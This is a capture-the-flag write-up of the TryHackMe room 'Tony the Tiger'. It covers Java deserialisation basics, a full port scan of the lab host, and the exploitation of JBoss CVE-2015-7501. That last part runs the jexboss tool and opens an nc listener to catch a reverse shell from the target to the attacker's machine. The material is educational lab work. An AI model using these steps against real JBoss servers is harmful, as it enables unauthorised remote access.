---
Learn how to use a Java Serialisation attack in this boot-to-root
---

# Tony the Tiger — Writeup

## Overview
### Tony the Tiger — Writeup
### Tony the Tiger — Writeup
### Deploy!
Start Machine
Firstly, ensure you are connected to the TryHackMe network via either the VPN Service or Kali Instance (subscribed members only). If you are not using the [Kali Instance](https://tryhackme.com/room/kali), you can [verify connectivity to the THM network on the "access" page](https://tryhackme.com/access). Or if you are new, you can learn how to connect by [visiting the OpenVPN Room](https://tryhackme.com/room/openvpn).
**Please allow up towards five minutes for this instance to fully boot - even as a subscribed member.** This is not a TryHackMe or AWS bottleneck, rather Java being Java and the web application taking time to fully initialise after boot.
Your Instance IP Address: `MACHINE_IP`
Deploying now and proceeding with the material below should allow for plenty of time for the instance to fully boot.
### Support Material
Whilst this is a CTF-style room, as the approach to ultimately "rooting" the box is new to TryHackMe, I will explain it a little and leave you to experiment with. There are flags laying around that aren't focused on the CVE, so I still encourage exploring this room. Explaining the whole-theory behind it is a little out of scope for this. However, I have provided some further reading material that may help with the room - or prove interesting!
What is "Serialisation"?
Serialisation at an abstract is the process of converting data - specifically "Objects" in Object-Oriented Programming (OOP) languages such as Java into lower-level formatting known as "byte streams", where it can be stored for later use such as within files, databases, and/or traversed across a network. It is then later converted from this "byte stream" back into the higher-level "Object". This final conversion is known as "De-serialisation"
![](https://media.geeksforgeeks.org/wp-content/uploads/serialization-5.jpg)
(kindly taken from [https://www.geeksforgeeks.org/classes-objects-java/](https://www.geeksforgeeks.org/classes-objects-java/))
So what is an "Object"?
"Objects" in a programming-context can be compared to real-life examples. Simply, an "Object" is just that - a thing. "Objects" can contain various types of information such as states or features. To correlate to a real-world example...Let's take a lamp.
A lamp is a great "Object". a lamp can be on or off, the lamp can have different types of bulbs - but ultimately it is still a lamp. What type of bulb it uses and whether or not the lamp is "on" or "off" in this instance is all stored within an "Object".
How can we exploit this process?
A "serialisation" attack is the injection and/or modification of data throughout the "byte stream" stage. When this data is later accessed by the application, malicious code can result in serious implications...ranging from DoS, data leaking or much more nefarious attacks like being "rooted"! Can you see where this is going...?
Answer the questions below
What is a great IRL example of an "Object"?
*lamp*
What is the acronym of a possible type of attack resulting from a "serialisation" attack?
*DoS*
What lower-level format does data within "Objects" get converted into?
*byte stream*

## Enumeration
Your first reaction to being presented with an instance should be information gathering.
Answer the questions below
```text
┌──(kali㉿kali)-[/]
└─$ rustscan -a 10.10.35.101 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.35.101:22
Open 10.10.35.101:80
Open 10.10.35.101:1090
Open 10.10.35.101:1091
Open 10.10.35.101:1098
Open 10.10.35.101:1099
Open 10.10.35.101:3873
Open 10.10.35.101:4446
Open 10.10.35.101:4713
Open 10.10.35.101:4712
Open 10.10.35.101:5445
Open 10.10.35.101:5455
Open 10.10.35.101:5500
Open 10.10.35.101:5501
Open 10.10.35.101:8009
Open 10.10.35.101:8080
Open 10.10.35.101:8083
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-28 13:04 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:04
Completed NSE at 13:04, 0.00s elapsed
Initiating Ping Scan at 13:04
Scanning 10.10.35.101 [2 ports]
Completed Ping Scan at 13:04, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:04
Completed Parallel DNS resolution of 1 host. at 13:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:04
Scanning 10.10.35.101 [17 ports]
Discovered open port 80/tcp on 10.10.35.101
Discovered open port 8009/tcp on 10.10.35.101
Discovered open port 5501/tcp on 10.10.35.101
Discovered open port 22/tcp on 10.10.35.101
Discovered open port 8080/tcp on 10.10.35.101
Discovered open port 5455/tcp on 10.10.35.101
Discovered open port 4712/tcp on 10.10.35.101
Discovered open port 1098/tcp on 10.10.35.101
Discovered open port 8083/tcp on 10.10.35.101
Discovered open port 3873/tcp on 10.10.35.101
Discovered open port 1091/tcp on 10.10.35.101
Discovered open port 1099/tcp on 10.10.35.101
Discovered open port 4446/tcp on 10.10.35.101
Discovered open port 5500/tcp on 10.10.35.101
Discovered open port 1090/tcp on 10.10.35.101
Discovered open port 5445/tcp on 10.10.35.101
Discovered open port 4713/tcp on 10.10.35.101
Completed Connect Scan at 13:04, 0.41s elapsed (17 total ports)
Initiating Service scan at 13:04
Scanning 17 services on 10.10.35.101
Completed Service scan at 13:07, 162.10s elapsed (17 services on 1 host)
NSE: Script scanning 10.10.35.101.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 29.79s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 1.47s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.01s elapsed
Nmap scan report for 10.10.35.101
Host is up, received syn-ack (0.21s latency).
Scanned at 2022-12-28 13:04:28 EST for 194s

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6978cb974d0f39efef3a5eaf8a9b57a (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJPG6mnFmBQ6zzd48LN35Vr7O1QkkSffOIQQl6+I5OKm/mqA4RK7QEgDEsFRgDcAaZDCv57bLTAEet7u5+Zxl7tK1NYS6PoJKP/V/SUL8HvdCjN7ECGgZbNl1/lD2oN4Ht0vLBiWOTNf+iBYAmszAuQuoFeQukynY+Yp6Vzm+deBAAAAFQCh+o/BZzN10pb6E32v/9UtFQVZYwAAAIBaQDnXWFqzvVdR41SJKzIHGovDvTeYRkriEOY/qsul50Qa6wUXBKj6g4Ew6E5JyqmA0OTtqCaduEVZghWFZC1xgfIMWDF0jrWLoeulkHS+66e6w4RTNYhkaQFReNQqYutiYLVItPYCGYTx6EjkenuOrjtBbDuKtzAqqCr5AwFjoAAAAIAdqC5XcUGUTNz60yiAP68wM4aw1QHCvR5uUU9rjc06XHjoddKpIGSoR99yxMh7iRZ1TrBRb3mvIdnJ5G6DcH9xgyvHz8Fc1VcBndlh7Ie18Bigs1hj5DmM7H73zB2U2zzoy8Kk8uYn9EprmEKQIqVKGLhH4zspFxBstbD3Ti9Xhg==
|   2048 33a47b9138585030892de457bb07bb2f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJTMdZ85+2MMzpdBPGCdSABGMN18/c4vhXcagSDSsQmLGhObXdYue1DcrmPR2QVJV7aRV9qYYEymcJdwNcCTul7C+gpyj4pD93L6Uxcsi7O3raxysBwWbrIrIYf7n8zKmOZcZeMbweXfgU6eXfnVHwivPkzTivg5uc7HdEfDHfDzE+2ScejK8+pQtkv2pGpXN8WC1/l0LO2YWgJ6cq1LkOkgTTqboi1wTsHhjUr7Ri+LAhiIHmAqmGWMH1q3p8y2NM+Hn4q1Po8Z4qOkl0u3XUm6iX/XWTXkCKTHFLnG33FbLQcMLJKPHP0azNw43UOz7EyVLQEFXSw60qsIdxuu55
|   256 21018b37f51e2bc557f1b042b732abea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmZ/g9gjkYbkCJ0BOQ7aNFijuj76pmv22y9wcRJJ3W0+lZkserfSgieJMHkRJcYRYlwRS804F9XM3cqr1tjNA0=
|   256 f636073c3b3d7130c4cd2a1300b525ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDUpCopvQzPXtEJ8L/lxYpJzOrcLLkU67fx71+Izsx6U
80/tcp   open  http        syn-ack Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Hugo 0.66.0
|_http-title: Tony&#39;s Blog
|_http-server-header: Apache/2.4.7 (Ubuntu)
1090/tcp open  java-rmi    syn-ack Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1091/tcp open  java-rmi    syn-ack Java RMI
1098/tcp open  java-rmi    syn-ack Java RMI
1099/tcp open  java-object syn-ack Java Object Serialization
| fingerprint-strings: 
|   NULL: 
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     }(ur
|     #http://thm-java-deserial.home:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpwA
|     UnicastRef2
|_    thm-java-deserial.home
3873/tcp open  java-object syn-ack Java Object Serialization
4446/tcp open  java-object syn-ack Java Object Serialization
4712/tcp open  msdtc       syn-ack Microsoft Distributed Transaction Coordinator (error)
4713/tcp open  pulseaudio? syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    126a
5445/tcp open  smbdirect?  syn-ack
5455/tcp open  apc-5455?   syn-ack
5500/tcp open  hotline?    syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     DIGEST-MD5
|     CRAM-MD5
|     GSSAPI
|     NTLM
|     thm-java-deserial
|   DNSVersionBindReqTCP, RTSPRequest, TLSSessionReq: 
|     GSSAPI
|     DIGEST-MD5
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   GenericLines, NULL: 
|     DIGEST-MD5
|     CRAM-MD5
|     NTLM
|     GSSAPI
|     thm-java-deserial
|   GetRequest: 
|     DIGEST-MD5
|     GSSAPI
|     CRAM-MD5
|     NTLM
|     thm-java-deserial
|   HTTPOptions, RPCCheck: 
|     NTLM
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     thm-java-deserial
|   Help: 
|     NTLM
|     CRAM-MD5
|     DIGEST-MD5
|     GSSAPI
|     thm-java-deserial
|   Kerberos: 
|     DIGEST-MD5
|     GSSAPI
|     NTLM
|     CRAM-MD5
|     thm-java-deserial
|   SSLSessionReq: 
|     GSSAPI
|     CRAM-MD5
|     DIGEST-MD5
|     NTLM
|     thm-java-deserial
|   TerminalServerCookie: 
|     NTLM
|     CRAM-MD5
|     GSSAPI
|     DIGEST-MD5
|_    thm-java-deserial
5501/tcp open  tcpwrapped  syn-ack
8009/tcp open  ajp13       syn-ack Apache Jserv (Protocol v1.3)
| ajp-methods: 
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        syn-ack Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to JBoss AS
|_http-favicon: Unknown favicon MD5: 799F70B71314A7508326D1D2F68F7519
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|_  Potentially risky methods: PUT DELETE TRACE
8083/tcp open  http        syn-ack JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.93%I=7%D=12/28%Time=63AC852D%P=x86_64-pc-linux-gnu%r(N
SF:ULL,17B,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x9
SF:7\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objBy
SF:tesq\0~\0\x01xpL\xc1}\(ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\0\0
SF:xp\0\0\x004\xac\xed\0\x05t\0#http://thm-java-deserial\.home:8083/q\0~\0
SF:\0q\0~\0\0uq\0~\0\x03\0\0\0\xcd\xac\xed\0\x05sr\0\x20org\.jnp\.server\.
SF:NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.R
SF:emoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server
SF:\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpwA\0\x0bUnicastRef2\0\0\
SF:x16thm-java-deserial\.home\0\0\x04J>\xa7\x03j\x06\xb8\xbem\xb1\xe2\x89\
SF:xd0\0\0\x01\x85Y\xb7\0\x9f\x80\x02\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3873-TCP:V=7.93%I=7%D=12/28%Time=63AC8533%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.93%I=7%D=12/28%Time=63AC8533%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4713-TCP:V=7.93%I=7%D=12/28%Time=63AC8533%P=x86_64-pc-linux-gnu%r(N
SF:ULL,5,"126a\n")%r(GenericLines,5,"126a\n")%r(GetRequest,5,"126a\n")%r(H
SF:TTPOptions,5,"126a\n")%r(RTSPRequest,5,"126a\n")%r(RPCCheck,5,"126a\n")
SF:%r(DNSVersionBindReqTCP,5,"126a\n")%r(DNSStatusRequestTCP,5,"126a\n")%r
SF:(Help,5,"126a\n")%r(SSLSessionReq,5,"126a\n")%r(TerminalServerCookie,5,
SF:"126a\n")%r(TLSSessionReq,5,"126a\n")%r(Kerberos,5,"126a\n")%r(SMBProgN
SF:eg,5,"126a\n")%r(X11Probe,5,"126a\n")%r(FourOhFourRequest,5,"126a\n")%r
SF:(LPDString,5,"126a\n")%r(LDAPSearchReq,5,"126a\n")%r(LDAPBindReq,5,"126
SF:a\n")%r(SIPOptions,5,"126a\n")%r(LANDesk-RC,5,"126a\n")%r(TerminalServe
SF:r,5,"126a\n")%r(NCP,5,"126a\n")%r(NotesRPC,5,"126a\n")%r(JavaRMI,5,"126
SF:a\n")%r(WMSRequest,5,"126a\n")%r(oracle-tns,5,"126a\n")%r(ms-sql-s,5,"1
SF:26a\n")%r(afp,5,"126a\n")%r(giop,5,"126a\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port5500-TCP:V=7.93%I=7%D=12/28%Time=63AC8533%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGE
SF:ST-MD5\x01\x08CRAM-MD5\x01\x04NTLM\x01\x06GSSAPI\x02\x11thm-java-deseri
SF:al")%r(GenericLines,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0
SF:\0\x02\x01\nDIGEST-MD5\x01\x08CRAM-MD5\x01\x04NTLM\x01\x06GSSAPI\x02\x1
SF:1thm-java-deserial")%r(GetRequest,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x
SF:03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\
SF:x04NTLM\x02\x11thm-java-deserial")%r(HTTPOptions,4B,"\0\0\0G\0\0\x01\0\
SF:x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x06GSSAPI\x01\x08CR
SF:AM-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deserial")%r(RTSPRequest,4B,"\0\
SF:0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\nD
SF:IGEST-MD5\x01\x04NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deserial")%r(RPCC
SF:heck,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04N
SF:TLM\x01\x06GSSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x02\x11thm-java-deser
SF:ial")%r(DNSVersionBindReqTCP,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x0
SF:3\x04\0\0\0\x02\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x04NTLM\x01\x08CRAM-M
SF:D5\x02\x11thm-java-deserial")%r(DNSStatusRequestTCP,4B,"\0\0\0G\0\0\x01
SF:\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x08CRAM-MD5\
SF:x01\x06GSSAPI\x01\x04NTLM\x02\x11thm-java-deserial")%r(Help,4B,"\0\0\0G
SF:\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x04NTLM\x01\x08CRAM-
SF:MD5\x01\nDIGEST-MD5\x01\x06GSSAPI\x02\x11thm-java-deserial")%r(SSLSessi
SF:onReq,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06
SF:GSSAPI\x01\x08CRAM-MD5\x01\nDIGEST-MD5\x01\x04NTLM\x02\x11thm-java-dese
SF:rial")%r(TerminalServerCookie,4B,"\0\0\0G\0\0\x01\0\x03\x04\0\0\0\x03\x
SF:03\x04\0\0\0\x02\x01\x04NTLM\x01\x08CRAM-MD5\x01\x06GSSAPI\x01\nDIGEST-
SF:MD5\x02\x11thm-java-deserial")%r(TLSSessionReq,4B,"\0\0\0G\0\0\x01\0\x0
SF:3\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\x06GSSAPI\x01\nDIGEST-MD5\x01\x04
SF:NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deserial")%r(Kerberos,4B,"\0\0\0G\
SF:0\0\x01\0\x03\x04\0\0\0\x03\x03\x04\0\0\0\x02\x01\nDIGEST-MD5\x01\x06GS
SF:SAPI\x01\x04NTLM\x01\x08CRAM-MD5\x02\x11thm-java-deserial");
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:07
Completed NSE at 13:07, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.28 seconds

https://es.wikipedia.org/wiki/WildFly

JBoss es un servidor de aplicaciones Java EE de código abierto implementado en Java puro.  Al estar basado en Java, JBoss puede ser utilizado en cualquier sistema operativo, para así estar disponible la máquina virtual de Java.  JBoss implementa todo el estándar JEE.  El  «JBoss Enterprise Application Platform» es el primer servidor de aplicaciones de código abierto, preparado para la producción y certificado JEE 6.0, disponible en el mercado, ofreciendo una plataforma de alto rendimiento para aplicaciones de e-business.

http://10.10.35.101:8080/ (JBoss RedHat)
```
What service is running on port "8080"
*Apache Tomcat/Coyote JSP engine 1.1*
What is the name of the front-end application running on "8080"?
*JBoss*

## Exploitation
Download the attached resources (48.3MB~) to this task by pressing the "Download" icon within this task.
FILE NAME: **jboss.zip (48.3MB~)**
MD5 CHECKSUM: **ED2B009552080A4E0615451DB0769F8B**
The attached resources are compiled together to ensure that everyone is able to complete the exploit, **these resources are not my own creations** (although have been very slightly modified for compatibility) **and all credit is retained to the respective authors listed within "credits.txt"** as well as the end of the room.
![](https://i.imgur.com/a1yznLT.png)
It is your task to research the vulnerability [CVE-2015-7501](https://www.rapid7.com/db/vulnerabilities/http-jboss-cve-2015-7501) and to use it to obtain a shell to the instance using the payload & exploit provided. There may be a few ways of doing it...If you are struggling, [I have written an example of how this vulnerability is used to launch an application on Windows.](https://blog.cmnatic.co.uk/posts/exploiting-java-deserialization-windows-demo/)
There's also a couple of ways of exploiting this service - I really encourage you to investigate into them yourself!
Answer the questions below
I have obtained a shell.
```text
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/JBoss%20CVE-2015-7501.py

https://github.com/byt3bl33d3r/java-deserialization-exploits/blob/master/JBoss/jboss.py
```
```text
┌──(kali㉿kali)-[~/tony_tiger/jboss]
└─$ ls
credits.txt  exploit.py  ysoserial.jar
```
```text
┌──(kali㉿kali)-[~/tony_tiger/jboss]
└─$ cat credits.txt  

----------------------------
DISCLAIMER:
----------------------------

I (CMNatic) do not claim any credit for the following code provided, I have merely gathered it together for use on THM for educational purposes.

All accredition is to the respective authors. 

----------------------------
(CVE-2015-7501 - exploit.py)
----------------------------
For the PoC Exploit written in Python (exploit.py): 

Author: @byt3bl33d3r
Website: https://github.com/byt3bl33d3r
Available at: https://github.com/byt3bl33d3r/java-deserialization-exploits/blob/master/JBoss/jboss.py

----------------------------
YSOSERIAL Payload
----------------------------
Java library used to generate the payload (Apache Commons, etc) within the PoC / CVE

Author(s): Chris Frohoff (frohoff)
Website: https://github.com/frohoff
Available at: https://github.com/frohoff/ysoserial
```
```text
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337

uhmm not work, let's try another

https://github.com/joaomatosf/jexboss

git clone https://github.com/joaomatosf/jexboss.git
cd jexboss
pip install -r requires.txt
python jexboss.py -h
```
```text
┌──(kali㉿kali)-[~/tony_tiger/jexboss]
└─$ python jexboss.py -host http://10.10.112.241:8080

 * --- JexBoss: Jboss verify and EXploitation Tool  --- *
 |  * And others Java Deserialization Vulnerabilities * | 
 |                                                      |
 | @author:  João Filho Matos Figueiredo                |
 | @contact: joaomatosf@gmail.com                       |
 |                                                      |
 | @update: https://github.com/joaomatosf/jexboss       |
 #______________________________________________________#

 @version: 1.2.4

 * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **

 ** Checking Host: http://10.10.112.241:8080 **

 [*] Checking jmx-console:                 
  [ VULNERABLE ]
 [*] Checking web-console:                 
  [ OK ]
 [*] Checking JMXInvokerServlet:           
  [ VULNERABLE ]
 [*] Checking admin-console:               
  [ EXPOSED ]
 [*] Checking Application Deserialization: 
  [ OK ]
 [*] Checking Servlet Deserialization:                                                                        
  [ OK ]
 [*] Checking Jenkins:                                                                                        
  [ OK ]
 [*] Checking Struts2:                                                                                        
  [ OK ]
                                                                                                              
                                                                                                              
 * Do you want to try to run an automated exploitation via "jmx-console" ?                                    
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? no

                                                                                                              
 * Do you want to try to run an automated exploitation via "JMXInvokerServlet" ?                              
   If successful, this operation will provide a simple command shell to execute 
   commands on the server..
   Continue only if you have permission!
   yes/NO? yes

 * Sending exploit code to http://10.10.112.241:8080. Please wait...                                          
                                                                                                              
 * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.          
   OBS: You can also use the --cmd "command" to send specific commands to run on the server.                  
   IP Address (RHOST): 10.8.19.103
   Port (RPORT): 4444

 * The exploit code was successfully sent. Check if you received the reverse shell
   connection on your server or if your command was executed.                                                 
   Type [ENTER] to continue...
```
```text
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.112.241.
Ncat: Connection from 10.10.112.241:55650.
bash: cannot set terminal process group (816): Inappropriate ioctl for device
bash: no job control in this shell
cmnatic@thm-java-deserial:/$ import TERM=xterm
import TERM=xterm
The program 'import' can be found in the following packages:
 * imagemagick
 * graphicsmagick-imagemagick-compat
Ask your administrator to install one of them
cmnatic@thm-java-deserial:/$ SHELL=/bin/bash script -q /dev/null
SHELL=/bin/bash script -q /dev/null
